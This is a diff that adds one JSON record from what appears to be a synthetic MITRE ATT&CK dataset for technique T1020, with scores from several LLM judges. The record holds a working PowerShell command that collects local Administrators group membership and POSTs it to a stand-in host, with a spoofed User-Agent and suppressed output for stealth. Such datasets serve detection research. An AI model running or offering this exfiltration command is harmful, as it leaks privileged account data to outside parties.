@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $b = Get-LocalGroupMember -Group 'Administrators' | Select-Object Name,ObjectClass,PrincipalSource | ConvertTo-Json -Compress; Invoke-WebRequest -Uri 'https://api.telemetry.example/ingest/admins' -Method Post -Body $b -ContentType 'application/json' -Headers @{ 'User-Agent'='Mozilla/5.0' } -ErrorAction SilentlyContinue",
+  "explanation": "Collects local Administrators group membership and exfiltrates it as compressed JSON via HTTPS POST.",
+  "rationale_steps": [
+    "Query privileged group membership using SYSTEM privileges.",
+    "Serialize results to JSON and send with Invoke-WebRequest POST.",
+    "Use generic headers and suppress output for stealth."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-de87e44d",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes, valid cmdlets/parameters, proper semicolons, and a correctly constructed headers hashtable.",
+        "semantic_score": 5,
+        "semantic_justification": "It collects local Administrators group data, converts it to compressed JSON, and exfiltrates via HTTPS POST—an automated script-driven transfer consistent with T1020 and typically feasible without elevated privileges.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:18:10.482805Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper semicolon separators, valid PowerShell cmdlets and parameters, and correct object pipeline structure.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by collecting administrator group membership data, converting it to compressed JSON, and sending it via HTTPS POST to an external endpoint with error handling and user-agent spoofing.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:18:13.910297Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, including proper command separation, balanced quotes, and valid parameter usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately uses appropriate PowerShell cmdlets to collect local group data, format it as minified JSON, and exfiltrate it via an HTTPS POST request, perfectly aligning with the described technique T1020 Automated Exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:18:25.997641Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
